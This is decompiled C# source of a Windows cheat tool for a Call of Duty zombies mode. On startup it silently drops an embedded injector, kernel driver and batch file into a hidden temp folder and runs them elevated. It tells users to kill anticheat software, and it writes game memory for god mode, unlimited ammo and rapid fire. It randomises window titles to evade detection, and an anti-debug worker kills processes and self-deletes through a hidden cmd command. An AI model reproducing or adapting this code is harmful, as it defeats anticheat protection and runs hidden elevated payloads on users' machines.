using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using kernalthingy;
using MainDriver;
using RAW.AntiDebug;
using RAW.GLOBAL;
using RAW.Properties;
using RAW.UTILITIES;
using Siticone.Desktop.UI.WinForms;
using Siticone.UI.WinForms;

namespace RAW.Tool
{
	// Token: 0x020000AF RID: 175
	public partial class MainForm : Form
	{
		// Token: 0x0600041E RID: 1054
		[DllImport("Gdi32.dll")]
		private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);

		// Token: 0x0600041F RID: 1055
		[DllImport("user32.dll")]
		private static extern short GetAsyncKeyState(Keys vKey);

		// Token: 0x06000420 RID: 1056 RVA: 0x00025AD4 File Offset: 0x00025AD4
		private void deleteSys()
		{
			string[] files = Directory.GetFiles(Path.GetTempPath(), "*.sys", SearchOption.AllDirectories);
			try
			{
				File.Delete(files[0]);
			}
			catch
			{
			}
		}

		// Token: 0x06000421 RID: 1057 RVA: 0x00025B10 File Offset: 0x00025B10
		public void startInstall(string wK)
		{
			Process process = new Process();
			process.StartInfo.FileName = wK;
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.Verb = "runas";
			process.Start();
			process.WaitForExit();
		}

		// Token: 0x06000422 RID: 1058 RVA: 0x00025B62 File Offset: 0x00025B62
		public static string randomStr(int wM)
		{
			return new string((from s in Enumerable.Repeat<string>("aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ0123456789", wM)
			select s[MainForm.vm.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x06000423 RID: 1059 RVA: 0x00025BA0 File Offset: 0x00025BA0
		private void writeInstall()
		{
			string text = Path.GetTempPath() + MainForm.randomStr(8) + "." + MainForm.randomStr(3);
			if (!Directory.Exists(text))
			{
				string path = text;
				Directory.CreateDirectory(path).Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				string str = text + "\\";
				File.WriteAllBytes(str + "inject.exe", AD.AF());
				File.WriteAllBytes(str + "Driver.sys", AD.AE());
				File.WriteAllBytes(str + "install.bat", AD.AG());
				this.startInstall(str + "install.bat");
				this.pathh = path;
				try
				{
					Directory.Delete(path, true);
					return;
				}
				catch
				{
					try
					{
						Directory.Delete(this.pathh, true);
					}
					catch
					{
					}
					return;
				}
			}
			MessageBox.Show("Please try again!");
		}

		// Token: 0x06000424 RID: 1060 RVA: 0x00025C90 File Offset: 0x00025C90
		public MainForm()
		{
			this.InitializeComponent();
			this.InitializeComponent();
			this.deleteSys();
			this.writeInstall();
			this.k = new gV();
			if (!this.k.proc("BlackOpsColdWar"))
			{
				MessageBox.Show("Please Have CW Open Before Using Program. If it is open make sure to kill any installed anticheats (Riot Vanguard most likely)");
				Application.Exit();
			}
			this.devlogin();
			this.CustomDesign();
		}

		// Token: 0x06000425 RID: 1061 RVA: 0x00025D54 File Offset: 0x00025D54
		public void devlogin()
		{
			Control.CheckForIllegalCrossThreadCalls = false;
			MainForm.form = this;
			this.Threads = new Threads();
			new Thread(new ThreadStart(this.Threads.PointerThread))
			{
				IsBackground = true
			}.Start();
			new Thread(new ThreadStart(this.Threads.LobbyThread))
			{
				IsBackground = true
			}.Start();
			new Thread(new ThreadStart(this.Threads.NameThread))
			{
				IsBackground = true
			}.Start();
			new Thread(new ThreadStart(this.Threads.AmmoThread))
			{
				IsBackground = true
			}.Start();
			new Thread(new ThreadStart(this.Threads.NoSleepThread))
			{
				IsBackground = true
			}.Start();
			if (!this.BGWorker.IsBusy)
			{
				this.BGWorker.RunWorkerAsync();
			}
			if (!this.DiscoWorker.IsBusy)
			{
				this.DiscoWorker.RunWorkerAsync();
			}
			if (!this.RapidFireWorker.IsBusy)
			{
				this.RapidFireWorker.RunWorkerAsync();
			}
			if (!this.AntiDebugWorker.IsBusy)
			{
				this.AntiDebugWorker.RunWorkerAsync();
			}
			if (!this.ZombieWorker.IsBusy)
			{
				this.ZombieWorker.RunWorkerAsync();
			}
			if (!this.LocationWorker.IsBusy)
			{
				this.LocationWorker.RunWorkerAsync();
			}
			if (!this.AutoFireWorker.IsBusy)
			{
				this.AutoFireWorker.RunWorkerAsync();
			}
		}

		// Token: 0x06000426 RID: 1062 RVA: 0x00025ECC File Offset: 0x00025ECC
		public void login()
		{
			if (Booleans.glhfc)
			{
				Control.CheckForIllegalCrossThreadCalls = false;
				MainForm.form = this;
				this.Threads = new Threads();
				new Thread(new ThreadStart(this.Threads.PointerThread))
				{
					IsBackground = true
				}.Start();
				new Thread(new ThreadStart(this.Threads.LobbyThread))
				{
					IsBackground = true
				}.Start();
				new Thread(new ThreadStart(this.Threads.NameThread))
				{
					IsBackground = true
				}.Start();
				new Thread(new ThreadStart(this.Threads.AmmoThread))
				{
					IsBackground = true
				}.Start();
				new Thread(new ThreadStart(this.Threads.NoSleepThread))
				{
					IsBackground = true
				}.Start();
				if (!this.BGWorker.IsBusy)
				{
					this.BGWorker.RunWorkerAsync();
				}
				if (!this.DiscoWorker.IsBusy)
				{
					this.DiscoWorker.RunWorkerAsync();
				}
				if (!this.RapidFireWorker.IsBusy)
				{
					this.RapidFireWorker.RunWorkerAsync();
				}
				if (!this.AntiDebugWorker.IsBusy)
				{
					this.AntiDebugWorker.RunWorkerAsync();
				}
				if (!this.ZombieWorker.IsBusy)
				{
					this.ZombieWorker.RunWorkerAsync();
				}
				if (!this.LocationWorker.IsBusy)
				{
					this.LocationWorker.RunWorkerAsync();
				}
				if (!this.AutoFireWorker.IsBusy)
				{
					this.AutoFireWorker.RunWorkerAsync();
				}
			}
		}

		// Token: 0x06000427 RID: 1063 RVA: 0x0002604C File Offset: 0x0002604C
		protected override void WndProc(ref Message m)
		{
			base.WndProc(ref m);
			if (m.Msg == 132)
			{
				m.Result = (IntPtr)2;
			}
		}

		// Token: 0x06000428 RID: 1064 RVA: 0x00026070 File Offset: 0x00026070
		public void selfDestruct()
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.ExecutablePath,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			});
			Environment.Exit(0);
		}

		// Token: 0x06000429 RID: 1065
		[DllImport("user32.dll")]
		private static extern bool SetWindowText(IntPtr hWnd, string text);

		// Token: 0x0600042A RID: 1066 RVA: 0x000260BC File Offset: 0x000260BC
		private void randomAppName()
		{
			foreach (Process process in Process.GetProcessesByName(this.pname))
			{
				string text = "";
				for (int j = 1; j <= 12; j++)
				{
					int num = this.rand.Next(0, this.letters.Length - 1);
					text += this.letters[num].ToString();
				}
				MainForm.SetWindowText(process.MainWindowHandle, text);
			}
		}

		// Token: 0x0600042B RID: 1067 RVA: 0x0002613C File Offset: 0x0002613C
		public void DisableAll()
		{
			this.WeaponCycleIntervalTrackBar.Value = 2;
			this.CycleValue.Text = "2";
			Variables.cycint = 2;
			this.Threads.m.WriteFloat(Offsets.BaseAddress + Offsets.XPScaleBase + Offsets.RankXP1, 1f);
			this.Threads.m.WriteFloat(Offsets.BaseAddress + Offsets.XPScaleBase + Offsets.RankXP2, 1f);
			this.Threads.m.WriteFloat(Offsets.BaseAddress + Offsets.XPScaleBase + Offsets.WPNXP, 1f);
			this.Threads.m.WriteFloat(this.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.JumpHeight,
				304UL
			}), 45f);
			this.TPZC.Checked = false;
			this.OneShotZombiesChk.Checked = false;
			Booleans.P1TP = false;
			Booleans.P2TP = false;
			Booleans.P3TP = false;
			Booleans.P4TP = false;
			Booleans.P1WPC = false;
			Booleans.P2WPC = false;
			Booleans.P3WPC = false;
			Booleans.P4WPC = false;
			this.Player1WeaponCycleChk.Checked = false;
			this.Player2WeaponCycleChk.Checked = false;
			this.Player3WeaponCycleChk.Checked = false;
			this.Player4WeaponCycleChk.Checked = false;
			Booleans.P1GM = false;
			Booleans.P2GM = false;
			Booleans.P3GM = false;
			Booleans.P4GM = false;
			this.Player1GodChk.Checked = false;
			this.Player2GodChk.Checked = false;
			this.Player3GodChk.Checked = false;
			this.Player4GodChk.Checked = false;
			Booleans.P1IA = false;
			Booleans.P2IA = false;
			Booleans.P3IA = false;
			Booleans.P4IA = false;
			this.Player1UnlimitedAmmoChk.Checked = false;
			this.Player2UnlimitedAmmoChk.Checked = false;
			this.Player3UnlimitedAmmoChk.Checked = false;
			this.Player4UnlimitedAmmoChk.Checked = false;
			Booleans.P1AC = false;
			Booleans.P2AC = false;
			Booleans.P3AC = false;
			Booleans.P4AC = false;
			Booleans.P1UP = false;
			Booleans.P2UP = false;
			Booleans.P3UP = false;
			Booleans.P4UP = false;
			this.Player1UnlimitedPointsChk.Checked = false;
			this.Player2UnlimitedPointsChk.Checked = false;
			this.Player3UnlimitedPointsChk.Checked = false;
			this.Player4UnlimitedPointsChk.Checked = false;
			Booleans.P1RF = false;
			Booleans.P2RF = false;
			Booleans.P3RF = false;
			Booleans.P4RF = false;
			this.Player1RapidFireChk.Checked = false;
			this.Player2RapidFireChk.Checked = false;
			this.Player3RapidFireChk.Checked = false;
			this.Player4RapidFireChk.Checked = false;
			Variables.p1wpn = 0;
			Variables.p1wpn2 = 0;
			Variables.p2wpn = 0;
			Variables.p2wpn2 = 0;
			Variables.p3wpn = 0;
			Variables.p3wpn2 = 0;
			Variables.p4wpn = 0;
			Variables.p4wpn2 = 0;
			this.WeaponSelectorCombo.SelectedIndex = 0;
			Variables.tp = 0;
		}

		// Token: 0x0600042C RID: 1068 RVA: 0x00009AC9 File Offset: 0x00009AC9
		private void CloseBtn_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x0600042D RID: 1069 RVA: 0x0002640C File Offset: 0x0002640C
		private void button2_Click(object sender, EventArgs e)
		{
			this.a1.Visible = true;
			this.a2.Visible = false;
			this.a3.Visible = false;
		}

		// Token: 0x0600042E RID: 1070 RVA: 0x00026434 File Offset: 0x00026434
		private void PlayerSelectPnl()
		{
			if (MainForm.SelectedPlayer == 1)
			{
				this.PlayerAllOptionsPnl.Visible = false;
				this.Player1OptionsPnl.Visible = true;
				this.Player2OptionsPnl.Visible = false;
				this.Player3OptionsPnl.Visible = false;
				this.Player4OptionsPnl.Visible = false;
				return;
			}
			if (MainForm.SelectedPlayer == 2)
			{
				this.PlayerAllOptionsPnl.Visible = false;
				this.Player1OptionsPnl.Visible = false;
				this.Player2OptionsPnl.Visible = true;
				this.Player3OptionsPnl.Visible = false;
				this.Player4OptionsPnl.Visible = false;
				return;
			}
			if (MainForm.SelectedPlayer == 3)
			{
				this.PlayerAllOptionsPnl.Visible = false;
				this.Player1OptionsPnl.Visible = false;
				this.Player2OptionsPnl.Visible = false;
				this.Player3OptionsPnl.Visible = true;
				this.Player4OptionsPnl.Visible = false;
				return;
			}
			if (MainForm.SelectedPlayer == 4)
			{
				this.PlayerAllOptionsPnl.Visible = false;
				this.Player1OptionsPnl.Visible = false;
				this.Player2OptionsPnl.Visible = false;
				this.Player3OptionsPnl.Visible = false;
				this.Player4OptionsPnl.Visible = true;
			}
		}

		// Token: 0x0600042F RID: 1071 RVA: 0x00026554 File Offset: 0x00026554
		private void ALLPlayers_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = true;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
		}

		// Token: 0x06000430 RID: 1072 RVA: 0x000265C4 File Offset: 0x000265C4
		private void Player1_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = true;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
			MainForm.SelectedPlayer = 1;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P1GM, Booleans.P1IA, Booleans.P1UP, Booleans.P1AC, Booleans.P1RF, Booleans.P1WPC, Variables.p1wpn, Variables.p1wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x06000431 RID: 1073 RVA: 0x0002667C File Offset: 0x0002667C
		private void Player2_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = true;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
			MainForm.SelectedPlayer = 2;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P2GM, Booleans.P2IA, Booleans.P2UP, Booleans.P2AC, Booleans.P2RF, Booleans.P2WPC, Variables.p2wpn, Variables.p2wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x06000432 RID: 1074 RVA: 0x00026734 File Offset: 0x00026734
		private void Player3_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = true;
			this.Player4OptionsPnl.Visible = false;
			MainForm.SelectedPlayer = 3;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P3GM, Booleans.P3IA, Booleans.P3UP, Booleans.P3AC, Booleans.P3RF, Booleans.P3WPC, Variables.p3wpn, Variables.p3wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x06000433 RID: 1075 RVA: 0x000267EC File Offset: 0x000267EC
		private void Player4_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
			this.PlayerAllOptionsPnl.Visible = false;
			this.Player1OptionsPnl.Visible = false;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = true;
			MainForm.SelectedPlayer = 4;
			this.PlayerSelectPnl();
			this.playerUpdate(Booleans.P4GM, Booleans.P4IA, Booleans.P4UP, Booleans.P4AC, Booleans.P4RF, Booleans.P4WPC, Variables.p4wpn, Variables.p4wpn2, Variables.tp);
			this.TeleportSelectorCombo.SelectedIndex = 0;
		}

		// Token: 0x06000434 RID: 1076 RVA: 0x000268A4 File Offset: 0x000268A4
		public void playerUpdate(bool GM, bool IA, bool UP, bool AC, bool RF, bool WPC, int wpn, int wpn2, int tp)
		{
			this.WeaponSelectorCombo.SelectedIndex = wpn2;
		}

		// Token: 0x06000435 RID: 1077 RVA: 0x000268B4 File Offset: 0x000268B4
		private void CustomDesign()
		{
			this.UsernameLbl.Text = Settings.Default.Username;
			this.PlayerSelectPnl();
			this.CloseBtn.Parent = this.MainBackgroundImage;
			this.a1.Parent = this.MainBackgroundImage;
			this.a2.Parent = this.MainBackgroundImage;
			this.a3.Parent = this.MainBackgroundImage;
			this.Player1OptionsPnl.Visible = true;
			this.Player2OptionsPnl.Visible = false;
			this.Player3OptionsPnl.Visible = false;
			this.Player4OptionsPnl.Visible = false;
			this.a1.Visible = true;
			this.a2.Visible = false;
			this.a3.Visible = false;
		}

		// Token: 0x06000436 RID: 1078 RVA: 0x0002640C File Offset: 0x0002640C
		private void HomeBtn_Click(object sender, EventArgs e)
		{
			this.a1.Visible = true;
			this.a2.Visible = false;
			this.a3.Visible = false;
		}

		// Token: 0x06000437 RID: 1079 RVA: 0x000039E3 File Offset: 0x000039E3
		private void DiscordBtn_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/DTvmR6JyJ4");
		}

		// Token: 0x06000438 RID: 1080 RVA: 0x00026974 File Offset: 0x00026974
		private void PlayerSettingsBtn_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = false;
			this.a3.Visible = true;
		}

		// Token: 0x06000439 RID: 1081 RVA: 0x0002699A File Offset: 0x0002699A
		private void GlobalSettingsBtn_Click(object sender, EventArgs e)
		{
			this.a1.Visible = false;
			this.a2.Visible = true;
			this.a3.Visible = false;
		}

		// Token: 0x0600043A RID: 1082 RVA: 0x000269C0 File Offset: 0x000269C0
		public ulong PCompPtr(int i)
		{
			return Offsets.PlayerCompPtr + Offsets.PC_ArraySize_Offset * (ulong)((long)i);
		}

		// Token: 0x0600043B RID: 1083 RVA: 0x000269D0 File Offset: 0x000269D0
		public static ulong PCompPtrStatic(int i)
		{
			return Offsets.PlayerCompPtr + Offsets.PC_ArraySize_Offset * (ulong)((long)i);
		}

		// Token: 0x0600043C RID: 1084 RVA: 0x000269E0 File Offset: 0x000269E0
		public ulong PPedPtr(int i)
		{
			return Offsets.PlayerCompPtr + Offsets.PP_ArraySize_Offset * (ulong)((long)i) + 8UL;
		}

		// Token: 0x0600043D RID: 1085 RVA: 0x000269F4 File Offset: 0x000269F4
		public void setCamo(int client, int camo)
		{
			this.Threads.m.WriteInt32(Offsets.PlayerCompPtr + Offsets.PC_ArraySize_Offset * (ulong)((long)client) + Offsets.PC_Camo - 23588UL, camo);
			this.Threads.m.WriteInt32(Offsets.PlayerCompPtr + Offsets.PC_ArraySize_Offset * (ulong)((long)client) + Offsets.PC_Camo - 23524UL, camo);
		}

		// Token: 0x0600043E RID: 1086 RVA: 0x00026A5C File Offset: 0x00026A5C
		public void setRet(int client, int ret)
		{
			this.Threads.m.WriteFloat(Offsets.PlayerCompPtr + Offsets.PC_ArraySize_Offset * (ulong)((long)client) + Offsets.PC_Camo - 23588UL, (float)ret);
			this.Threads.m.WriteFloat(Offsets.PlayerCompPtr + Offsets.PC_ArraySize_Offset * (ulong)((long)client) + Offsets.PC_Camo - 23524UL, (float)ret);
		}

		// Token: 0x0600043F RID: 1087 RVA: 0x00026AC4 File Offset: 0x00026AC4
		private void TPZL_Click(object sender, EventArgs e)
		{
			Booleans.P1TP = true;
			this.TPZC.Checked = false;
			Threads.P1Location = this.Threads.m.ReadVector3(this.Threads.m.GetPointer(new ulong[]
			{
				Offsets.BaseAddress + Offsets.PlayerBase + 8UL,
				Offsets.PP_Coords
			}));
		}

		// Token: 0x06000440 RID: 1088 RVA: 0x00026B28 File Offset: 0x00026B28
		private void TPZC_CheckedChanged(object sender, EventArgs e)
		{
			if (this.TPZC.Checked)
			{
				this.ZombieTPDistTrackBar.Enabled = true;
			}
			else
			{
				this.ZombieTPDistTrackBar.Enabled = false;
				this.ZombieTPDistTrackBar.Value = 150;
				this.TPValue.Text = "150";
			}
			if (this.TPZC.Checked)
			{
				Booleans.P1TP = false;
			}
		}

		// Token: 0x06000441 RID: 1089 RVA: 0x00026B8F File Offset: 0x00026B8F
		private void DiscoCamosChk_CheckedChanged(object sender, EventArgs e)
		{
			if (this.ToggleDCamo.Checked)
			{
				Variables.camo = 62;
			}
		}

		// Token: 0x06000442 RID: 1090 RVA: 0x00026BA8 File Offset: 0x00026BA8
		private void SpeedTrackBar_Scroll(object sender, ScrollEventArgs e)
		{
			this.PlayerSpeedValue.Text = this.SpeedTrackBar.Value.ToString();
			int value = this.SpeedTrackBar.Value;
			for (int i = 0; i < 4; i++)
			{
				this.Threads.m.WriteFloat(Offsets.PlayerCompPtr + Offsets.PC_ArraySize_Offset * (ulong)((long)i) + Offsets.PC_RunSpeed, (float)this.SpeedTrackBar.Value);
			}
			if (this.SpeedTrackBar.Value == 1)
			{
				for (int j = 0; j < 4; j++)
				{
					this.Threads.m.WriteFloat(Offsets.PlayerCompPtr + Offsets.PC_ArraySize_Offset * (ulong)((long)j) + Offsets.PC_RunSpeed, 1f);
				}
			}
		}

		// Token: 0x06000443 RID: 1091 RVA: 0x00026C60 File Offset: 0x00026C60
		private void SpeedToggle_CheckedChanged(object sender, EventArgs e)
		{
			if (this.ToggleSPEED.Checked)
			{
				this.SpeedTrackBar.Enabled = true;
				return;
			}
			if (!this.ToggleSPEED.Checked)
			{
				this.SpeedTrackBar.Value = 1;
				this.SpeedTrackBar.Enabled = false;
				this.PlayerSpeedValue.Text = "1";
			}
		}

		// Token: 0x06000444 RID: 1092 RVA: 0x00026CBC File Offset: 0x00026CBC
		private void TPZCDistance_Scroll(object sender, ScrollEventArgs e)
		{
			Variables.tpDistance = Convert.ToInt32(this.TPValue.Text);
			this.TPValue.Text = this.ZombieTPDistTrackBar.Value.ToString();
		}

		// Token: 0x06000445 RID: 1093 RVA: 0x00026CFC File Offset: 0x00026CFC
		private void CycleInterval_Scroll(object sender, ScrollEventArgs e)
		{
			Variables.cycint = this.WeaponCycleIntervalTrackBar.Value;
			this.CycleValue.Text = this.WeaponCycleIntervalTrackBar.Value.ToString();
		}

		// Token: 0x06000446 RID: 1094 RVA: 0x00026D38 File Offset: 0x00026D38
		private void BGWorker_DoWork(object sender, DoWorkEventArgs e)
		{
			for (;;)
			{
				try
				{
					if (Offsets.BaseAddress != 0UL)
					{
						Booleans.GameAttached = true;
						this.AttachedStateLbl.ForeColor = Color.Green;
						this.AttachedStateLbl.Text = "CONNECTED";
					}
					else
					{
						Booleans.GameAttached = false;
						this.AttachedStateLbl.ForeColor = Color.Blue;
						this.AttachedStateLbl.Text = "SEARCHING.";
						Thread.Sleep(500);
						this.AttachedStateLbl.Text = "SEARCHING..";
						Thread.Sleep(500);
						this.AttachedStateLbl.Text = "SEARCHING...";
						Thread.Sleep(100);
					}
					bool inGame = Booleans.InGame;
					Thread.Sleep(500);
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000447 RID: 1095 RVA: 0x00026E0C File Offset: 0x00026E0C
		private void DiscoWorker_DoWork(object sender, DoWorkEventArgs e)
		{
			for (;;)
			{
				for (int i = 0; i < 4; i++)
				{
					if (this.ToggleDCamo.Checked)
					{
						this.setCamo(i, Variables.camo);
					}
				}
				Variables.camo++;
				if (Variables.camo == 70)
				{
					Variables.camo = 62;
				}
				Thread.Sleep(1000);
			}
		}

		// Token: 0x06000448 RID: 1096 RVA: 0x00026E68 File Offset: 0x00026E68
		private void RapidFireWorker_DoWork(object sender, DoWorkEventArgs e)
		{
			for (;;)
			{
				if (Booleans.P1RF && MainForm.GetAsyncKeyState(Keys.LButton) < 0)
				{
					this.Threads.m.WriteInt32(this.PCompPtr(0) + Offsets.PC_RapidFire1, 0);
					this.Threads.m.WriteInt32(this.PCompPtr(0) + Offsets.PC_RapidFire2, 0);
				}
				if (Booleans.P2RF)
				{
					this.Threads.m.WriteInt32(this.PCompPtr(1) + Offsets.PC_RapidFire1, 0);
					this.Threads.m.WriteInt32(this.PCompPtr(1) + Offsets.PC_RapidFire2, 0);
				}
				if (Booleans.P3RF)
				{
					this.Threads.m.WriteInt32(this.PCompPtr(2) + Offsets.PC_RapidFire1, 0);
					this.Threads.m.WriteInt32(this.PCompPtr(2) + Offsets.PC_RapidFire2, 0);
				}
				if (Booleans.P4RF)
				{
					this.Threads.m.WriteInt32(this.PCompPtr(3) + Offsets.PC_RapidFire1, 0);
					this.Threads.m.WriteInt32(this.PCompPtr(3) + Offsets.PC_RapidFire2, 0);
				}
				Thread.Sleep(50);
			}
		}

		// Token: 0x06000449 RID: 1097 RVA: 0x00026F98 File Offset: 0x00026F98
		private void AutoFireWorker_DoWork(object sender, DoWorkEventArgs e)
		{
			for (;;)
			{
				if (this.Player1AFNRChk.Checked)
				{
					this.Threads.m.WriteAByte(this.PCompPtr(0) + Offsets.PC_autoFire, 1);
					this.Threads.m.WriteAByte(this.PCompPtr(0) + Offsets.PC_noRecoil, 0);
				}
				else
				{
					this.Threads.m.WriteAByte(this.PCompPtr(0) + Offsets.PC_autoFire, 0);
					this.Threads.m.WriteAByte(this.PCompPtr(0) + Offsets.PC_noRecoil, 1);
				}
				if (this.Player2AFNRChk.Checked)
				{
					this.Threads.m.WriteAByte(this.PCompPtr(1) + Offsets.PC_autoFire, 1);
					this.Threads.m.WriteAByte(this.PCompPtr(1) + Offsets.PC_noRecoil, 0);
				}
				else
				{
					this.Threads.m.WriteAByte(this.PCompPtr(1) + Offsets.PC_autoFire, 0);
					this.Threads.m.WriteAByte(this.PCompPtr(1) + Offsets.PC_noRecoil, 1);
				}
				if (this.Player3AFNRChk.Checked)
				{
					this.Threads.m.WriteAByte(this.PCompPtr(2) + Offsets.PC_autoFire, 1);
					this.Threads.m.WriteAByte(this.PCompPtr(2) + Offsets.PC_noRecoil, 0);
				}
				else
				{
					this.Threads.m.WriteAByte(this.PCompPtr(2) + Offsets.PC_autoFire, 0);
					this.Threads.m.WriteAByte(this.PCompPtr(2) + Offsets.PC_noRecoil, 1);
				}
				if (this.Player4AFNRChk.Checked)
				{
					this.Threads.m.WriteAByte(this.PCompPtr(3) + Offsets.PC_autoFire, 1);
					this.Threads.m.WriteAByte(this.PCompPtr(3) + Offsets.PC_noRecoil, 0);
				}
				else
				{
					this.Threads.m.WriteAByte(this.PCompPtr(3) + Offsets.PC_autoFire, 0);
					this.Threads.m.WriteAByte(this.PCompPtr(3) + Offsets.PC_noRecoil, 1);
				}
				Thread.Sleep(2);
			}
		}

		// Token: 0x0600044A RID: 1098 RVA: 0x000271CC File Offset: 0x000271CC
		private void AntiDebugWorker_DoWork(object sender, DoWorkEventArgs e)
		{
			for (;;)
			{
				Scanner.ScanAndKill();
				if (DebugProtect1.PerformChecks() == 1)
				{
					File.Create("C:\\Windows\\Temp\\win64debug.tmp");
					this.selfDestruct();
				}
				if (DebugProtect2.PerformChecks() == 1)
				{
					File.Create("C:\\Windows\\Temp\\win64debug.tmp");
					this.selfDestruct();
				}
				Thread.Sleep(5000);
			}
		}

		// Token: 0x0600044B RID: 1099 RVA: 0x0002721C File Offset: 0x0002721C
		private void ZombieWorker_DoWork(object sender, DoWorkEventArgs e)
		{
			while (!this.ZombieWorker.CancellationPending)
			{
				try
				{
					this.ZMCountLbl.Text = this.ZMCountLeft().ToString();
					Thread.Sleep(100);
				}
				catch (Exception)
				{
					this.ZombieWorker.CancelAsync();
				}
			}
		}

		// Token: 0x0600044C RID: 1100 RVA: 0x0002727C File Offset: 0x0002727C
		private void ZombieWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
		{
			this.ZMCountLbl.Text = "N/A";
		}

		// Token: 0x0600044D RID: 1101 RVA: 0x0002728E File Offset: 0x0002728E
		public int ZMCountLeft()
		{
			return this.Threads.m.ReadInt32(Offsets.ZMGlobalBase + Offsets.ZM_Global_ZMLeftCount);
		}

		// Token: 0x0600044E RID: 1102 RVA: 0x000272AC File Offset: 0x000272AC
		private void LocationWorker_DoWork(object sender, DoWorkEventArgs e)
		{
			while (!this.LocationWorker.CancellationPending)
			{
				try
				{
					Threads.updatedPlayerPos = this.m.ReadVector3(this.PPedPtr(0) + Offsets.PP_Coords);
					Thread.Sleep(100);
				}
				catch (Exception)
				{
					this.LocationWorker.CancelAsync();
				}
			}
		}

		// Token: 0x0600044F RID: 1103 RVA: 0x00027310 File Offset: 0x00027310
		private void P1Cycle_Tick(object sender, EventArgs e)
		{
			if (Booleans.P1WPC)
			{
				int num = this.Threads.m.ReadInt32(this.PCompPtr(0) + Offsets.PC_KillCount);
				if (num % Variables.cycint == 0)
				{
					this.Threads.m.WriteInt32(this.PCompPtr(0) + Offsets.PC_KillCount, num + 1);
					this.Threads.m.WriteInt64(this.PCompPtr(0) + Offsets.PC_SetWeaponID, (long)Variables.GunListCycle[this.p1]);
					this.p1++;
				}
				if (this.p1 == 63)
				{
					this.p1 = 1;
					return;
				}
			}
			else
			{
				this.P1Cycle.Stop();
			}
		}

		// Token: 0x06000450 RID: 1104 RVA: 0x000273C4 File Offset: 0x000273C4
		private void P2Cycle_Tick(object sender, EventArgs e)
		{
			if (Booleans.P2WPC)
			{
				int num = this.Threads.m.ReadInt32(this.PCompPtr(1) + Offsets.PC_KillCount);
				if (num % Variables.cycint == 0)
				{
					this.Threads.m.WriteInt32(this.PCompPtr(1) + Offsets.PC_KillCount, num + 1);
					this.Threads.m.WriteInt64(this.PCompPtr(1) + Offsets.PC_SetWeaponID, (long)Variables.GunListCycle[this.p2]);
					this.p2++;
				}
				if (this.p2 == 63)
				{
					this.p2 = 1;
					return;
				}
			}
			else
			{
				this.P2Cycle.Stop();
			}
		}

		// Token: 0x06000451 RID: 1105 RVA: 0x00027478 File Offset: 0x00027478
		private void P3Cycle_Tick(object sender, EventArgs e)
		{
			if (Booleans.P3WPC)
			{
				int num = this.Threads.m.ReadInt32(this.PCompPtr(2) + Offsets.PC_KillCount);
				if (num % Variables.cycint == 0)
				{
					this.Threads.m.WriteInt32(this.PCompPtr(2) + Offsets.PC_KillCount, num + 1);
					this.Threads.m.WriteInt64(this.PCompPtr(2) + Offsets.PC_SetWeaponID, (long)Variables.GunListCycle[this.p3]);
					this.p3++;
				}
				if (this.p3 == 63)
				{
					this.p3 = 1;
					return;
				}
			}
			else
			{
				this.P3Cycle.Stop();
			}
		}

		// Token: 0x06000452 RID: 1106 RVA: 0x0002752C File Offset: 0x0002752C
		private void P4Cycle_Tick(object sender, EventArgs e)
		{
			if (Booleans.P4WPC)
			{
				int num = this.Threads.m.ReadInt32(this.PCompPtr(3) + Offsets.PC_KillCount);
				if (num % Variables.cycint == 0)
				{
					this.Threads.m.WriteInt32(this.PCompPtr(3) + Offsets.PC_KillCount, num + 1);
